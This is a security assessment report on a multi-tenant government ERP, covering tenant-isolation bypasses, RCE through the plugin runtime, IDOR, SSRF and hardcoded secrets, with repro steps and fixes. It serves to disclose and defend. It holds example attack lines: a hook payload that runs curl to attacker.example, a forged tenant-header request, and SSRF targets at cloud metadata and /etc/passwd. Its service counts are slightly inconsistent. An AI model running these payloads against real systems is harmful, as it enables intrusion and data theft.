# CivitasOne Security Assessment Report — L06

**Branch:** `court-management-service`  
**Date:** 2026-07-12  
**Scope:** All 38 services + shared packages (`@civitasone/auth`, `@civitasone/db`)  
**Method:** Static analysis (file:line evidence), grep-based pattern search, manual code review of auth/authZ flows, schema analysis. No live traffic, no destructive DB ops.

---

## Executive Summary

| Category | Score |
|---|---|
| **Security** | **3 / 10** |
| **Authorization** | **5 / 10** |

Three P0 vulnerabilities are confirmed, each independently catastrophic for a multi-tenant government ERP:

1. **Gateway does not overwrite the `x-tenant-id` header from JWT** — any authenticated user can access any other tenant's data by supplying a forged `x-tenant-id: <victim-tenant-uuid>`.
2. **`createTenantTxHook` sources the PostgreSQL RLS GUC from the `x-tenant-id` header, not the JWT** — 25 of 38 services have no JWT-based override; the DB isolation backstop is neutralized fleet-wide when Finding 1 is exploited.
3. **Plugin runtime executes arbitrary JavaScript via `new Function()`** — any authenticated user can achieve server-side RCE when `PLUGIN_RUNTIME_ENABLED=true`.

On the positive side: JWT algorithm enforcement is robust (HS256 blocked in production, `alg:none` rejected), expiry is enforced, privilege escalation to higher roles is blocked, rate limiting on auth endpoints is in place, and the application-layer WHERE clauses in most services correctly use `ctx.tenantId` from the JWT. These mitigations reduce blast radius for the RLS-only path but do not compensate for the gateway bypass.

---

## P0 Findings

### SEC-P0-01 — Gateway Does Not Overwrite Client-Supplied `x-tenant-id` with JWT `tid` Claim

**File:** `services/gateway-service/src/jwt-edge.ts:63`  
**Severity:** P0 — Full cross-tenant read/write for any authenticated user

```typescript
// Line 63-65
if (payload.tid && !req.headers["x-tenant-id"]) {
  (req.headers as Record<string, string>)["x-tenant-id"] = payload.tid;
}
```

**What is wrong:** The gateway verifies the JWT (`verifyJwt`, line 57) and extracts the authenticated `payload.tid` (the tenant the user actually belongs to). However, it only _populates_ `x-tenant-id` when the client did _not_ send one. If the client sends `x-tenant-id: <any-other-tenant-uuid>`, the `if (!req.headers["x-tenant-id"])` condition is false, the JWT-derived tenant is discarded, and the forged value is forwarded to all upstream services.

**Propagation:** `services/gateway-service/src/app.ts:31` explicitly lists `"x-tenant-id"` in `FORWARD_HEADERS`, so the forged value reaches every upstream service unmodified.

**Repro:**
```bash
TOKEN=$(sign_token tenant=TENANT_A)     # Legitimately issued token for tenant A
curl -H "Authorization: Bearer $TOKEN" \
     -H "x-tenant-id: TENANT_B_UUID" \
     https://gateway/api/v1/finance/budgets
# Returns TENANT_B's budget data — no 403, no audit alert
```

**Combined blast radius with SEC-P0-02:** When this forged header reaches any of the 25 services whose RLS GUC is also header-sourced, _both_ the application-layer `ctx.tenantId` (derived from JWT, correct) and the DB-layer `app.tenant_id` GUC (derived from header, forged) diverge. For services relying on RLS as the final backstop, the backstop is also bypassed.

**Fix:** Replace the conditional with an unconditional overwrite:
```typescript
if (payload.tid) {
  (req.headers as Record<string, string>)["x-tenant-id"] = payload.tid; // Always overwrite
}
```

---

### SEC-P0-02 — `createTenantTxHook` Sources RLS GUC from `x-tenant-id` Header (25 Services)

**File:** `packages/db/src/tenant-tx.ts:57`  
**Severity:** P0 — PostgreSQL RLS tenant isolation bypassed at DB layer for 25 services

```typescript
// Line 52-70 — createTenantTxHook
export function createTenantTxHook(db: DrizzleDb) {
  return async function tenantTxHook(req, _reply) {
    const tenantId = req.headers["x-tenant-id"] as string | undefined;  // ← raw header
    if (tenantId) {
      tenantStorage.enterWith({ tenantId });   // → drives SET LOCAL app.tenant_id GUC
    }
    (req as any).tenantTx = tenantId
      ? (fn) => tenantTransaction(db, tenantId, fn)
      : (fn) => db.transaction(fn);
  };
}
```

**What is wrong:** The PostgreSQL `app.tenant_id` GUC (which the RLS policies read via `current_setting('app.tenant_id')`) is set from the raw `x-tenant-id` **header**, not from the verified JWT claim. This is the only DB-layer defence-in-depth backstop; when bypassed, RLS policies are silently satisfied with attacker-controlled tenant values.

**Services that added a correcting JWT-override hook** (10/38 — safe):
`court-service`, `visitor-service`, `meeting-service`, `billing-service`, `identity-service`, `finance-service`, `notification-service`, `workflow-service`, `payroll-service`, `hrms-service`

**Services still using header-only GUC** (25/38 — RLS backstop broken):
`admin-service`, `analytics-service`, `asset-service`, `audit-service`, `citizen-service`, `contract-service`, `crm-service`, `estab-service`, `grant-service`, `helpdesk-service`, `install-service`, `inventory-service`, `knowledge-service`, `legal-service`, `location-service`, `ml-service`, `plugin-service`, `policy-service`, `procurement-service`, `project-service`, `queue-service`, `report-service`, `stock-service`, `telephony-service`, `tenant-service`, `theme-service`

**Combined attack path:** SEC-P0-01 (gateway forwards forged header) + SEC-P0-02 (25 services set RLS GUC from that header) = full cross-tenant DB access bypassing both application-layer and RLS-layer controls simultaneously on 25 services.

**Fix:** In `createTenantTxHook`, accept a `getJwtTenantId` callback parameter (or read from `req.ctx`) and use it exclusively in production:
```typescript
export function createTenantTxHook(db: DrizzleDb, getJwtTenantId?: (req) => string | undefined) {
  return async function tenantTxHook(req, _reply) {
    const tenantId = getJwtTenantId?.(req) ?? (req.headers["x-tenant-id"] as string);
    // ...
  };
}
```

---

### SEC-P0-03 — Plugin Runtime Executes Arbitrary JavaScript via `new Function()`

**File:** `services/plugin-service/src/modules/runtime/engine.ts:132`  
**Severity:** P0 — Server-side RCE for any authenticated tenant user when `PLUGIN_RUNTIME_ENABLED=true`

```typescript
// Line 132 — executeInSandbox()
const fn = new Function("ctx", `"use strict"; return (async () => { ${handler} })()`);
```

`handler` is `hook.handlerPath` — a `TEXT` column populated directly from `body.handlerPath` submitted to `POST /v1/plugins/hooks`. The Zod validator at `plugins/hooks/validators.ts` validates only `z.string().min(1).max(512)` — any valid string, including arbitrary JavaScript.

**The "sandbox" provides no isolation:** `new Function()` in Node.js runs in the main process with full access to `require`, `process`, `global`, the filesystem, and the network. The comment on line 100 explicitly acknowledges this: _"In production, this would use Node.js worker_threads or vm2 for true isolation."_ The proper sandboxed path (`sandbox/runtime.ts` using worker_threads) exists but is never called from the hook execution path.

**Repro:**
```bash
# Register a malicious hook
curl -X POST /v1/plugins/hooks \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"eventType":"*","handlerPath":"require(\"child_process\").execSync(\"curl https://attacker.example/$(id)\")"}'
# On next event dispatch → arbitrary command executes in the service process
```

**Gate:** `PLUGIN_RUNTIME_ENABLED=true` is required. If this is `false` (the default), `executeHooks` returns `[]` early and the code path is not reached. However, this is a feature-flag protecting a fundamentally broken implementation — flipping the flag enables RCE without further configuration.

**Fix:** Replace `new Function()` with the existing `sandbox/runtime.ts` worker-threads implementation. Do not ship `engine.ts` as the production hook executor.

---

## P1 Findings

### SEC-P1-01 — Payslip PDF IDOR: Employee Can Read Any Co-Worker's Payslip

**File:** `services/payroll-service/src/modules/payslip-pdf/routes.ts:79-89`  
**Severity:** P1 — Intra-tenant IDOR exposing salary, PAN, bank account, deductions

```typescript
const READER_ROLES = ["payroll_admin", "payroll_officer", "super_admin", "hr_admin",
                       "finance_officer", "employee"];     // ← 'employee' included

app.get("/v1/payroll/slips/:id/pdf", async (req, reply) => {
  const ctx = resolveContext(req);
  requireRole(ctx, READER_ROLES);
  const { id } = pathParamSchema.parse(req.params);

  const slipRows = await scopedRead((tx) => tx.select().from(payrollSlips)
    .where(and(eq(payrollSlips.id, id), eq(payrollSlips.tenantId, ctx.tenantId)))  // ← no employee check
    .limit(1));
```

The shared service context exports `enforceEmployeeOwnership()` (`src/shared/context.ts:66`), which is correctly called in `form16-pdf/routes.ts:124`, `tax/routes.ts:66,163`, and `statutory-returns/routes.ts:266`. It is absent here. An employee can iterate UUIDs and download any co-worker's payslip (gross pay, net pay, all deductions, PAN, bank IFSC, UAN).

**Repro:** Employee A GETs `/v1/payroll/slips/<employee-B-slip-uuid>/pdf` → receives Employee B's full salary breakdown.

**Fix:** Add after `requireRole`:
```typescript
const employeeId = enforceEmployeeOwnership(ctx, slip?.employeeNo);
```
Or filter the DB query with an additional `eq(payrollSlips.employeeNo, ctx.actorId)` when the caller has role `employee`.

---

### SEC-P1-02 — ML Service: Prediction History and Inference Endpoints Have No Role Check

**File:** `services/ml-service/src/modules/predictions/routes.ts:30` and `inference/routes.ts:72`  
**Severity:** P1 — Any authenticated user can query prediction scores and invoke ML inference

```typescript
// predictions/routes.ts:30
app.get("/v1/ml/predictions", async (req, reply) => {
  const ctx = resolveContext(req);
  // NO requireRole() call — any authenticated role proceeds
  const query = predictionsQuery.parse(req.query);
  ...

// inference/routes.ts:72
const ctx = resolveContext(req);
if (ctx.tenantId !== body.tenantId) { ... }
// Still no requireRole() — only a tenant match check
```

Every other ml-service route explicitly requires `["ml_admin", "analytics_admin", "super_admin"]`. These two were missed. An `employee`-role user can query full ML prediction history for any entity and submit inference requests.

**Fix:** Add `requireRole(ctx, ML_ADMIN_ROLES)` immediately after `resolveContext(req)` in both handlers.

---

### SEC-P1-03 — CRM: Deal DELETE Uses `crm_user` Role; Contacts DELETE Correctly Requires Admin

**Files:** `services/crm-service/src/modules/deals/routes.ts:114` and `contacts/routes.ts:104`  
**Severity:** P1 — Broken function-level authorization; any `crm_user` can soft-delete any deal

```typescript
// deals/routes.ts:114
app.delete("/v1/crm/deals/:id", async (req, reply) => {
  requireRole(ctx, CRM_ROLES);  // CRM_ROLES = ["crm_user", "crm_admin", "super_admin"]

// contacts/routes.ts:104 — correct reference pattern
app.delete("/v1/crm/contacts/:id", async (req, reply) => {
  requireRole(ctx, ADMIN_ROLES); // ADMIN_ROLES = ["crm_admin", "super_admin"]
```

Additionally, `PATCH /v1/crm/deals/:id` and `PATCH /v1/crm/activities/:id` publish commands without verifying the target record exists or belongs to the calling user, while `PATCH /v1/crm/contacts/:id` explicitly checks `existing.ownerId !== ctx.actorId` and raises 403.

**Fix:** Change deal DELETE to `ADMIN_ROLES`; add ownership pre-fetch to deal PATCH.

---

### SEC-P1-04 — Theme Service: GET Brand Endpoints Resolve Tenant from Raw Header

**File:** `services/theme-service/src/modules/tokens/brand-routes.ts:84-88`  
**Severity:** P1 — Cross-tenant brand configuration read for any authenticated user

```typescript
function resolveTenantId(req): string {
  const tenantId = req.headers["x-tenant-id"] as string | undefined;  // raw header
  if (!tenantId) throw new HttpError(400, "MISSING_TENANT", ...);
  return tenantId;
}

app.get("/v1/themes/brand", async (req, reply) => {
  const tenantId = resolveTenantId(req);  // NOT ctx.tenantId from JWT
```

The mutation routes (`PUT /v1/themes/brand`) correctly use `resolveContext(req).tenantId`. The two read routes diverge, allowing enumeration of other tenants' brand configuration (colors, logo URLs, custom CSS).

**Fix:** Replace `resolveTenantId(req)` with `resolveContext(req).tenantId` in both GET handlers.

---

### SEC-P1-05 — SCIM Tenant Resolved Entirely from `x-tenant-id` Header

**File:** `services/identity-service/src/modules/scim/routes.ts:39-41`  
**Severity:** P1 — A compromised SCIM bearer token grants read/write to users in any tenant

```typescript
function tenantId(req): string {
  return (req.headers["x-tenant-id"] as string)
    || SCIM_TENANT_ID
    || "00000000-0000-0000-0000-000000000001";
}
```

SCIM uses a separate bearer token (`SCIM_BEARER_TOKEN`) unrelated to user JWTs. The tenant for all SCIM operations is drawn entirely from the `x-tenant-id` header. A holder of `SCIM_BEARER_TOKEN` (e.g., a compromised IdP SCIM connector) can add/remove users from any tenant by setting any UUID in the header.

**Fix:** Bind `SCIM_BEARER_TOKEN` to a specific `SCIM_TENANT_ID` at startup; reject requests where the header differs from the pre-configured tenant.

---

### SEC-P1-06 — Pensioner POST Writes PAN and Bank Account via Raw SQL, Bypassing `encryptedText`

**File:** `services/payroll-service/src/modules/payroll/routes.ts:151-171`  
**Severity:** P1 — PAN and bank account numbers stored in plaintext instead of AES-GCM encrypted

```typescript
// Schema (payroll/schema.ts:121-123)
bankAccountNo: encryptedText("bank_account_no"),   // Drizzle column transform → AES-GCM
bankIfsc:      encryptedText("bank_ifsc"),
pan:           encryptedText("pan"),

// Route handler (routes.ts:156-170) — direct raw SQL INSERT
await db.execute(sql`
  INSERT INTO payroll.payroll_pensioners
    (..., bank_account_no, bank_ifsc, pan, ...)
  VALUES
    (..., ${b.bankAccountNo ?? null}, ${b.bankIfsc ?? null}, ${b.pan ?? null}, ...)
`);
```

The `encryptedText` Drizzle column type applies AES-GCM encryption/decryption as a column transform. A raw `sql\`` template bypasses Drizzle's column transforms entirely — `bankAccountNo` and `pan` are written to the database in plaintext. This also violates the CQRS architecture rule (direct DB write in a route handler).

**Fix:** Use the Drizzle ORM insert (`db.insert(payrollPensioners).values({...})`) so the `encryptedText` transform applies, or pre-encrypt values explicitly using `payrollPiiCrypto.encrypt()` before the raw INSERT.

---

### SEC-P1-07 — SSRF via Unvalidated `RecordingUrl` from Twilio Webhook

**File:** `services/telephony-service/src/modules/webhooks/routes.ts:143, 163` → `recordings/consumer.ts:100`  
**Severity:** P1 — SSRF to internal network / AWS metadata endpoint via Twilio webhook

```typescript
// webhooks/routes.ts:143 — public endpoint, Twilio signature check only
const recordingUrl = body["RecordingUrl"] ?? "";  // verbatim from POST body
// ...
recordingUrl: `${recordingUrl}.mp3`,              // enqueued

// recordings/consumer.ts:100
const { content, contentType } = await downloadRecording(p.recordingUrl);
// downloadRecording() → fetch(url, ...) with no allowlist
```

No scheme, host, or protocol validation on `RecordingUrl`. A forged or replayed Twilio webhook (Twilio signature validation can be bypassed if `TWILIO_AUTH_TOKEN` is leaked) pointing to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` causes the consumer to fetch that URL and persist the response as a "recording" in S3.

**Fix:** Validate `recordingUrl` with an allowlist of Twilio-owned hostnames (`api.twilio.com`, `*.twilio.com`) before enqueuing; reject any other scheme or host.

---

### SEC-P1-08 — SSRF via `downloadUrl` from eCourts API Response

**File:** `services/legal-service/src/modules/ecourts/sync-consumer.ts:102`  
**Severity:** P1 — SSRF via third-party API response; `file://` and internal URLs reachable

```typescript
// sync-consumer.ts:102
response = await fetch(order.downloadUrl, { signal: controller.signal });
```

`order.downloadUrl` comes from the external eCourts/NJDG API response (`adapter.ts:127`), with no scheme or hostname validation. A compromised or MITM'd eCourts endpoint can redirect the consumer to internal services, AWS metadata, or `file:///etc/passwd`.

**Fix:** Parse `downloadUrl` and validate hostname is a known eCourts domain before fetching.

---

### SEC-P1-09 — Hardcoded Plaintext DB Passwords for `BYPASSRLS` Roles in Migration Files

**Files:**
- `services/visitor-service/migrations/0009_scanner_role.sql:27`
- `services/meeting-service/migrations/0007_meeting_scanner_role.sql:28`

```sql
CREATE ROLE visitor_scanner LOGIN PASSWORD 'visitor_scanner_dev_pw'
-- visitor_scanner is BYPASSRLS — bypasses all RLS tenant policies
CREATE ROLE meeting_scanner LOGIN PASSWORD 'meeting_scanner_dev_pw'
-- meeting_scanner is BYPASSRLS
```

These plaintext passwords are committed to version control for roles that explicitly `BYPASSRLS`. If dev/staging databases are seeded from these migrations (the typical case), the credentials provide an attacker with a direct path to cross-tenant data that bypasses all RLS policies entirely.

**Fix:** Generate these passwords at migration time from a secrets manager; do not commit even `_dev_pw` suffixed passwords for BYPASSRLS roles.

---

### SEC-P1-10 — Hardcoded DB Credentials as `vitest.config.ts` Defaults (28 Services)

**Example:** `services/meeting-service/vitest.config.ts:8-9`
```typescript
env: {
  DATABASE_URL: process.env.DATABASE_URL
    ?? "postgres://meeting_svc:meeting_dev_pw@localhost:5435/civitas_meeting",
  ...
  VISITOR_PII_KEY: process.env.VISITOR_PII_KEY ?? "dev_visitor_pii_master_key_32chars",
}
```

Every service has a fallback hardcoded connection string with plaintext password. The `visitor-service` additionally hardcodes the master AES-GCM PII encryption key (`"dev_visitor_pii_master_key_32chars"`). Any data encrypted by tests run without `VISITOR_PII_KEY` set is decryptable by anyone who reads the source. The migration files commit the matching passwords (SEC-P1-09), making this a cross-confirmed credential pair.

**Fix:** Remove fallback literals for all credentials; fail fast at startup if required env vars are absent (visitor-service's production `app.ts` already does this correctly — apply the same pattern to test config).

---

### SEC-P1-11 — `fetchPendingPayrollRuns` Omits `x-service-secret`, Silently Swallows 401

**File:** `services/payroll-service/src/shared/hrms-client.ts:63-70`  
**Severity:** P1 — Inter-service auth failure masked as business data; logic error + security gap

```typescript
export async function fetchPendingPayrollRuns(tenantId: string): Promise<number> {
  const res = await fetch(`${PAYROLL_URL}/v1/payroll/runs?limit=50`, {
    headers: { "x-internal": "1", "x-tenant-id": tenantId },  // ← missing x-service-secret
    signal: AbortSignal.timeout(5000),
  });
  if (!res.ok) return 0;  // ← 401 silently treated as "0 pending runs"
```

The `authPlugin` requires `x-service-secret` alongside `x-internal: 1` (constant-time `timingSafeEqual` check). Without it, the upstream service responds 401. The caller swallows the error with `return 0`, producing a false "no pending runs" answer to all callers. The companion function `fetchPayrollInput` (lines 43-61 in the same file) correctly includes the secret header.

**Fix:** Add `"x-service-secret": process.env.INTERNAL_SERVICE_SECRET ?? ""` to the headers. Replace `if (!res.ok) return 0` with `if (!res.ok) throw new Error(\`hrms-client: ${res.status}\`)`.

---

## P2 Findings

### SEC-P2-01 — ABAC Policy Enforcement Defaults to `"off"` at Gateway

**File:** `services/gateway-service/src/policy-check.ts:20`

```typescript
const MODE = (process.env.POLICY_ENFORCE ?? "off") as EnforceMode;
// Line 44:
if (MODE === "off") return true;  // all mutations pass through
```

Fine-grained ABAC rules from policy-service are completely bypassed unless `POLICY_ENFORCE=true` is explicitly set. In a default deployment, all POST/PUT/PATCH/DELETE requests skip attribute-based policy evaluation.

**Fix:** Change default to `"audit"` (log policy decisions without rejecting); document `POLICY_ENFORCE=true` as required for production.

---

### SEC-P2-02 — No JWT Blacklist on Session Revocation (Bounded Window)

Identity-service correctly revokes Keycloak sessions on logout and marks sessions `revoked` in DB. However, no Redis blacklist exists for already-issued JWTs. A stolen short-lived token remains valid until its `exp` — typically 5–15 minutes. For a government ERP, this window may be unacceptable for privileged accounts.

**Fix:** Maintain a Redis set of revoked `jti` (JWT ID) or `sid` (session ID) claims; check it in `verifyJwt()` before returning the payload.

---

### SEC-P2-03 — Court-Service PATCH Mutations Return 202 for Non-Existent/Foreign IDs

**Files:** `court-service/src/modules/hearing/routes.ts:32-38`, `appeal/routes.ts:48-75`, `compliance/routes.ts:32-38`, `notice/routes.ts:58-98`, `party/routes.ts:75-82`

The consumer does enforce tenant ownership at the DB layer (`getHearingForUpdate(tx, tenantId, hearingId)`). However, the route layer returns a misleading `202 Accepted` for IDs that don't exist in the tenant — silently no-ops rather than returning a synchronous 404. This can mask IDOR probing (attacker submits PATCH for a foreign resource and cannot distinguish "does not exist" from "succeeded silently").

---

### SEC-P2-04 — APBS Download File Contains Full 12-Digit Aadhaar Numbers Without DLP Controls

**File:** `services/payroll-service/src/modules/bank-transfer/routes.ts`, `apbs-writer.ts:160`

The `GET /v1/payroll/runs/:id/bank-transfer-file` endpoint generates a fixed-width APBS file embedding full 12-digit Aadhaar numbers for all employees in a payroll run. This is served as an HTTP download with no DLP logging, no download limits, and no watermarking. UIDAI regulations require masking Aadhaar digits in any file that isn't a direct machine-to-machine submission; the file is also accessible to `finance_officer` role.

---

### SEC-P2-05 — HRMS Public Careers Endpoint Accepts Any String as `tenantId` (Enumeration Risk)

**File:** `services/hrms-service/src/modules/recruitment/routes.ts:118-125`

The public job board endpoint (`config: { public: true }`) accepts `tenantId` from query string or header with no UUID-format validation. Any string is accepted and used in a DB query. While the query is parameterized (no SQLi risk), invalid UUIDs produce unhelpful DB errors that leak internal table names.

---

### SEC-P2-06 — `X-Forwarded-For` Spoofable for Evacuation IP Allowlist Check

**File:** `services/visitor-service/src/modules/evacuation/routes.ts:83`

Emergency evacuation roster IP allowlist uses `req.headers["x-forwarded-for"].split(",")[0]` — clients can inject a trusted IP prefix to pass the check. Mitigated by JWT + role guard still applying.

---

### SEC-P2-07 — Gateway `/internal/config` Endpoint Exposed on Public Port

**File:** `services/gateway-service/src/app.ts:261-282`

`GET/PATCH /internal/config` (requires `x-internal-secret`) is registered on the same public-facing port as the proxy (8080). This endpoint can disable JWT edge verification at runtime. A Kubernetes NetworkPolicy restricts pod-level access; bare-metal/VM deployments rely solely on the shared secret.

---

### SEC-P2-08 — Raw `sql.unsafe()` with String Interpolation in Test Teardown

**File:** `services/meeting-service/tests/integration-quorum-resume.test.ts:65, 95`

```typescript
await sql.unsafe(`delete from meeting.${t} where tenant_id = '${TENANT}'`);
```

`t` and `TENANT` are test constants (not runtime user input) so this is not currently exploitable. However, `sql.unsafe()` with string interpolation in committed tests violates the repo's own "no raw SQL outside Drizzle migrations" rule and is a dangerous pattern if cargo-culted into production helpers. The court-service equivalent (`lifecycle.e2e.test.ts:69`) correctly uses positional parameters.

---

## Solid / Clean Findings

| Area | Status | Evidence |
|---|---|---|
| JWT algorithm confusion (`alg:none`, HS256↔RS256) | **Clean** | `packages/auth/src/index.ts:87-128` — `algorithms: ["RS256"]` explicit allowlist; HS256 throws in production |
| Token expiry enforcement | **Clean** | No `ignoreExpiration`, `clockTolerance` found anywhere |
| Auth endpoint rate limiting | **Clean** | `gateway-service/src/app.ts:343-360` — dedicated 10 req/min auth-path limiter, Redis-backed, keyed by username |
| Privilege escalation (role self-assignment) | **Clean** | `identity-service/src/modules/rbac/routes.ts:13` — `requireRole(ctx, ADMIN)` before any body parse |
| Mass assignment | **Clean** | All mutation routes use explicit Zod schemas; `id`, `tenantId`, `createdBy`, `version` absent from all input schemas |
| Password storage | **Clean** | No `passwordHash` in any service schema — delegated to Keycloak entirely |
| SQL injection | **Clean** | All production DB code uses Drizzle ORM or postgres.js tagged templates (parameterized); raw SQL only in test teardown |
| Internal header stripping at gateway | **Clean** | `gateway-service/src/app.ts:36` strips `x-internal`, `x-service-secret`, `x-internal-caller` from all external inbound requests; covered by `gateway-service/tests/security.test.ts:29-74` |
| Vendor PII stripping in procurement API | **Clean** | `procurement-service/src/modules/vendors/routes.ts:48` calls `stripPii()` on all list/get responses |

---

## Risk Summary Table

| ID | Severity | Category | File:Line | Finding |
|---|---|---|---|---|
| SEC-P0-01 | **P0** | Tenant Isolation | `gateway-service/src/jwt-edge.ts:63` | Gateway forwards client-supplied `x-tenant-id`; does not overwrite from JWT |
| SEC-P0-02 | **P0** | Tenant Isolation | `packages/db/src/tenant-tx.ts:57` | `createTenantTxHook` sources RLS GUC from header; 25/38 services affected |
| SEC-P0-03 | **P0** | Injection/RCE | `plugin-service/src/modules/runtime/engine.ts:132` | `new Function(handler)` executes user-supplied JS when plugin runtime enabled |
| SEC-P1-01 | P1 | AuthZ/BOLA | `payroll-service/src/modules/payslip-pdf/routes.ts:85` | Employee reads any co-worker's payslip; `enforceEmployeeOwnership()` missing |
| SEC-P1-02 | P1 | AuthZ/BFLA | `ml-service/src/modules/predictions/routes.ts:30` and `inference/routes.ts:72` | No `requireRole` on prediction history and inference endpoints |
| SEC-P1-03 | P1 | AuthZ/BFLA | `crm-service/src/modules/deals/routes.ts:114` | Deal DELETE uses `crm_user` role; contacts DELETE correctly requires admin |
| SEC-P1-04 | P1 | AuthZ/BOLA | `theme-service/src/modules/tokens/brand-routes.ts:84` | GET brand resolves tenant from raw header → cross-tenant brand read |
| SEC-P1-05 | P1 | AuthZ/BOLA | `identity-service/src/modules/scim/routes.ts:40` | SCIM tenant from header only; any SCIM token holder can operate on all tenants |
| SEC-P1-06 | P1 | Data-at-rest | `payroll-service/src/modules/payroll/routes.ts:156` | Raw SQL INSERT bypasses `encryptedText` transform; PAN/bank account in plaintext |
| SEC-P1-07 | P1 | SSRF | `telephony-service/src/modules/webhooks/routes.ts:143` + `recordings/consumer.ts:100` | Unvalidated `RecordingUrl` from Twilio webhook → fetch to arbitrary URL |
| SEC-P1-08 | P1 | SSRF | `legal-service/src/modules/ecourts/sync-consumer.ts:102` | `downloadUrl` from eCourts API response fetched without hostname allowlist |
| SEC-P1-09 | P1 | Secrets | `visitor-service/migrations/0009_scanner_role.sql:27` + `meeting-service/migrations/0007_*.sql:28` | Hardcoded plaintext passwords for BYPASSRLS DB roles committed to git |
| SEC-P1-10 | P1 | Secrets | All `services/*/vitest.config.ts` (28 files) | Hardcoded `*_dev_pw` passwords + PII master key as env var fallback defaults |
| SEC-P1-11 | P1 | Auth | `payroll-service/src/shared/hrms-client.ts:66` | `fetchPendingPayrollRuns` omits `x-service-secret`; 401 silently returns 0 |
| SEC-P2-01 | P2 | AuthZ | `gateway-service/src/policy-check.ts:20` | `POLICY_ENFORCE` defaults to `"off"`; all ABAC rules skipped in default deploy |
| SEC-P2-02 | P2 | Auth | `identity-service/src/modules/sessions/consumer.ts` | No JWT blacklist on session revocation; token valid until expiry after logout |
| SEC-P2-03 | P2 | AuthZ | `court-service/src/modules/hearing/routes.ts:32` (and 4 others) | PATCH mutations return 202 for non-existent/foreign IDs; masks IDOR probing |
| SEC-P2-04 | P2 | Data-at-rest | `payroll-service/src/modules/bank-transfer/apbs-writer.ts:160` | APBS download file embeds full 12-digit Aadhaar numbers; no DLP controls |
| SEC-P2-05 | P2 | Input Validation | `hrms-service/src/modules/recruitment/routes.ts:119` | Public careers endpoint accepts any string as `tenantId`; no UUID validation |
| SEC-P2-06 | P2 | Auth | `visitor-service/src/modules/evacuation/routes.ts:83` | `X-Forwarded-For` spoofable for IP allowlist; not stripped at gateway |
| SEC-P2-07 | P2 | Auth | `gateway-service/src/app.ts:261` | `/internal/config` (disables JWT verification) on same public port as proxy |
| SEC-P2-08 | P2 | Injection | `meeting-service/tests/integration-quorum-resume.test.ts:65` | `sql.unsafe()` with string interpolation in committed test (not production) |

---

## Scores

| Dimension | Score | Rationale |
|---|---|---|
| **Security** | **3 / 10** | Three confirmed P0s: gateway header bypass enables cross-tenant access for any authenticated user; createTenantTxHook RLS GUC break neutralizes DB-layer isolation on 25/38 services; plugin `new Function()` is server-side RCE. Eleven P1s covering SSRF, data-at-rest crypto bypass, hardcoded BYPASSRLS credentials, and inter-service auth silence. Positives: JWT algorithm enforcement is robust, expiry enforced, rate limiting on auth endpoints, mass assignment blocked, SQL injection not possible via Drizzle. |
| **Authorization** | **5 / 10** | Role-check discipline is generally sound across the fleet — RBAC helpers are used consistently, and most GET handlers scope reads correctly with `ctx.tenantId` from JWT. Key gaps: payslip IDOR for employees (P1), ML inference/predictions with no role check (P1), CRM deal DELETE with wrong role (P1), SCIM header-only tenant (P1), theme-service GET using raw header (P1). No mass assignment. No privilege escalation via self-assignment. The BOLA pattern is correctly implemented in the majority of services. |

---

*LANE_DONE L06 score=3*
